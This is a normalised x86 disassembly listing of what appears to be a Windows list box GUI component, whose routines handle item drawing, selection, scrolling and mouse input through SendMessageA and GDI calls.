mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40348c
sub_436228
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440694
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_43d908
mov edx 0x61
mov eax ebx
call sub_43d92c
mov dl 0x1
mov eax ebx
call sub_444b9c
xor edx edx
mov eax ebx
call sub_43e310
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43cd28
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_436314
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4407b8
mov eax [ esi + 0x228 ]
call sub_403290
mov eax [ esi + 0x218 ]
call sub_403290
mov eax [ esi + 0x240 ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4363e0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_436400
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43643c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43645c
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_444968
push eax
call SendMessageA
sub_436490
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_4368e4
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_4364d8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4365ef
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4365f6
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404004
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4044a0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041d8
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4044a0
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4041d8
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_436894
test al al
je r-xdata
jmp r-xdata
sub_436600
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_436894
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_43666c
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_43db50
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a74
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov esi 0x1
sub_4366c0
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_441f08
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax ebx
call sub_43666c
sub_436704
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_436780
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_444968
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_444968
push eax
call SendMessageA
jmp r-xdata
sub_4367e0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_441f08
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_436808
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_43f334
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_436894
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_444968
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
sub_4368e4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_444968
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_444968
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_444968
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
jmp r-xdata
sub_4369b8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_441f08
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_436994
sub_436a10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436abf
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4044a0
mov edx eax
mov eax [ esi + 0x8 ]
call sub_408584
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov [ esi + 0xc ] eax
jmp r-xdata
sub_436ac4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b61
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov [ esi + 0xc ] eax
jmp r-xdata
sub_436b7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4369f4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_444968
push eax
call SendMessageA
sub_436ba8
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_4369b8
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4369b8
jmp r-xdata
sub_436bec
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_4369f4
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_43f334
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_436c78
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4417f4
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_441720
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_40348c
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_436d90
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_441920
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_444968
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_43666c
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_437758
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_436b7c
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40cdfc
sub_436e60
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_441d04
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_4369f4
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_436edc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_44237c
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_43e8f0
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4422e8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_436f42
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_4552a4
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_43f804
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_43e7f4
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069fc
mov edx esp
mov cl 0x1
mov eax esi
call sub_436bec
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_436894
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_43e7f4
jmp r-xdata
sub_436fe0
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_43dd58
mov eax esi
mov si 0xffeb
call sub_40348c
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40348c
jmp r-xdata
pop esi
retn
sub_437014
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_444968
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_444968
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_444968
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_444968
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_444968
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_4369f4
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_412640
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_437174
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442af8
push ebp
call sub_437014
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4371b8
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_43dc90
lea eax [ esp + 0x18 ]
call sub_406a10
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_437218
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437324
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_41d2ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43732b
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edx 0x824
mov eax ebx
call sub_440460
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_43783c
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_403fe0
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042a0
push eax
mov eax [ ebp - 0x8 ]
call sub_4044a0
push eax
mov eax [ ebx + 0x228 ]
call sub_41d780
push eax
call DrawTextA
sub_437354
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_41d800
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_41d67c
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_41d698
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_41d2ec
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cf14
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c728
xor edx edx
mov eax [ esi + 0x228 ]
call sub_41d800
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_437410
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_437440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443f80
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_441f08
sub_43746c
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_4368e4
inc edi
dec ebx
jne r-xdata
sub_4374a4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4044a0
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444968
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_437884
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
